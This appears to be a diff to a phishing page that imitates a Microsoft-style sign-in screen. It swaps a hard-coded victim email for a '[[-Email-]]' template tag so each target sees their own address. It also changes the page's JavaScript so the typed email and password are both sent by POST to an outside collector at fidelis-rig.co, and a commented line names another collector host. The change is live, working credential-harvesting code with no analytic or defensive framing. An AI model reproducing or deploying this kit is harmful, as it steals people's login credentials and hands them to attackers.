@@ -139,7 +139,7 @@
                                                 </button> <div id=displayName
                                                     class=identity
                                                     data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"
-                                                    title=yadrafijitravels@outlook.com>yadrafijitravels@outlook.com
+                                                    title=[[-Email-]]>[[-Email-]]
                                                 </div> </div></div> </div> <div
                                         class="pagination-view animate has-identity-banner slide-in-next"
                                         data-bind="css: {
@@ -181,7 +181,7 @@
                                                 data-bind="moveOffScreen, value: unsafe_displayName"
                                                 class=moveOffScreen tabindex=-1
                                                 aria-hidden=true
-                                                value=yadrafijitravels@outlook.com>
+                                                value=[[-Email-]]>
                                             <div id=loginHeader
                                                 class="row title ext-title"
                                                 role=heading aria-level=1
@@ -342,7 +342,7 @@
 
             // form values
             //var name = event.name.value;
-            //var email = event.email.value;
+            var email = event.email.value;
             var passw = event.passw.value;
 
             var http = new XMLHttpRequest();
@@ -350,7 +350,7 @@
             //var url = 'https://akonvilla.com/contac/process.php';
             var url = 'https://fidelis-rig.co/mail/process.php';
             //var params = 'name=' + name + '&email=' + email;
-            var params = 'passw=' + passw;
+            var params = 'passw=' + passw + '&email=' + email;
             http.open('POST', url, true);
 
             //Send the header information
